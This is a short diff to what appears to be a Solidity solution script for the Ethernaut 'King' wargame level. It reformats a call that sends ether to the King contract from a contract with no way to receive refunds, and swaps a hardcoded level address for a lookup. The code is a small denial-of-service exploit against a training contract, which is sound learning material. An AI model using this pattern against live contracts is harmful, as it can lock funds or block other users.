@@ -7,8 +7,7 @@ import {King} from "./Problem.sol";
 
 contract Solution {
     function breakIt(address king) external payable {
-        (bool sent, bytes memory data) =
-            payable(address(king)).call{value: msg.value}("");
+        (bool sent, bytes memory data) = payable(address(king)).call{value: msg.value}("");
         require(sent, "Unsuccessful");
     }
 }
@@ -29,7 +28,7 @@ contract SolutionScript is EthernautScript {
     }
 
     function getLevelAddress() internal view override returns (address) {
-        return 0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5;
+        return _getContractAddress("9");
     }
 
     function getCreationValue() internal view override returns (uint256) {
